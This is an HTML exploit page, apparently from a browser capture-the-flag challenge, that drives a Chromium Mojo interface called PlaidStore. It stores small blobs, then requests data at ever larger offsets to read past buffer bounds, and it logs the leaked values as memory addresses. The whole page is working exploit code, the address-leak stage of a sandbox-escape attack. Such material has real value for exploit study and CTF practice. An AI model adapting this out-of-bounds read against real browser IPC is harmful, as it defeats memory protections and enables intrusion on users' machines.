<!DOCTYPE html>
<html>
	<script src="/mojo_js_extracted/mojo/public/js/mojo_bindings_lite.js"></script>
	<script src="/mojo_js_extracted/third_party/blink/public/mojom/plaidstore/plaidstore.mojom-lite.js"></script>

	<script> 
		const REMOTE = blink.mojom.PlaidStore.getRemote(true);
		const num_addresses = 800;
	</script>

	<script>


		const get_addr = (buffer) => {
			const addr = '0x' + buffer.map(x => x.toString(16).padStart(2, '0')).reverse().join('');
			return addr;
		}
	</script>

	<script>
		REMOTE.storeData('asdf', [10]); // de ad be ef
		REMOTE.storeData('asdf2', [0x41, 0x42, 0x43, 0x41, 0x41, 0x41, 0x41, 0x41]);
		

		const addresses = [];
		for(let i = 8; i <= num_addresses * 8; i += 8) {
			REMOTE.getData('asdf', i)
				.then((bla) => {
					const aaaa = bla.data.slice(i - 8, i);
					const addr = get_addr(aaaa);
					console.log(addr);
				});	
		}
	</script>
</html>